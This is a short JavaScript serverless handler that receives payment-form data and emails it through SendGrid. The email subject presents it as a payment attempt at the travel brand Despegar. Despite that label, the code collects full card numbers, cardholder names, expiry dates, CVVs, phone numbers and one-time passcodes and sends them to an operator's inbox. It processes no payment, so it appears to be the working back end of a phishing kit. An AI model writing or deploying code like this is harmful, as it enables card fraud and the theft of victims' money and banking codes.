// api/collect.js
import sgMail from "@sendgrid/mail";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Método no permitido" });
  }

  const data = req.body;

  try {
    // Configurar SendGrid
    sgMail.setApiKey(process.env.SENDGRID_API_KEY);

    const msg = {
      to: process.env.TARGET_EMAIL, // correo que recibe
      from: process.env.SENDGRID_FROM, // remitente validado en SendGrid
      subject: "📩 Nuevo intento de pago en Despegar (Prueba)",
      text: JSON.stringify(data, null, 2),
      html: `
        <h2>Nuevo intento de pago</h2>
        <p><b>Teléfono:</b> ${data.phone}</p>
        <p><b>Tarjeta:</b> ${data.cardNumber}</p>
        <p><b>Titular:</b> ${data.cardHolder}</p>
        <p><b>Vencimiento:</b> ${data.cardExpiry}</p>
        <p><b>CVV:</b> ${data.cardCVV}</p>
        <p><b>Total:</b> ${data.total}</p>
        <p><b>OTP ingresado:</b> ${data.otp}</p>
      `
    };

    await sgMail.send(msg);

    return res.status(200).json({ message: "Correo enviado con éxito ✅" });
  } catch (error) {
    console.error("Error enviando correo:", error);
    return res.status(500).json({ error: "Error enviando correo ❌" });
  }
}
